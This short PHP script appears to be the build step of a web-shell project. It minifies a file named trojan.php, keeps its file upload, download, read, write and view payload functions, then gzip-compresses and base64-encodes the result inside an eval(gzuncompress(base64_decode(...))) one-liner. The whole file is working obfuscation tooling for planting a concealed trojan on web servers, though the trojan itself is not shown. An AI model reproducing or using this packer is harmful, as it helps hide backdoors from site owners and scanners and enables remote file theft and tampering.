<?php

/**
 * This file minifies and obfuscates the plaintext trojan.php file. The Rake 
 * file defers to it, because it's just a bit more natural to keep all of this 
 * stuff in PHP.
 */

# include the minifier
# @see: https://github.com/chrisallenlane/tiny-and-weird
require dirname(__FILE__) . DIRECTORY_SEPARATOR . 'tiny-and-weird.php';

# minify the specified file
$options = array(
    'remove_whitespace' => true,
    'tokens_to_ignore'  => array(
        'payload_file_down',
        'payload_file_read',
        'payload_file_up',
        'payload_file_view',
        'payload_file_write',
        'payload_image_view',
    ),
);
$minifier = new TinyAndWeird($options);
$source   = $minifier->minify($argv[1]);

# strip opening and closing php tags
$source   = ltrim($source, '<?php');
$source   = rtrim($source, '?>');

# compress the source
$deflated = gzcompress($source, 9);
$encoded  = base64_encode($deflated);

# output the result
$trojan_source = "<?php eval(gzuncompress(base64_decode('$encoded')));";
echo $trojan_source;
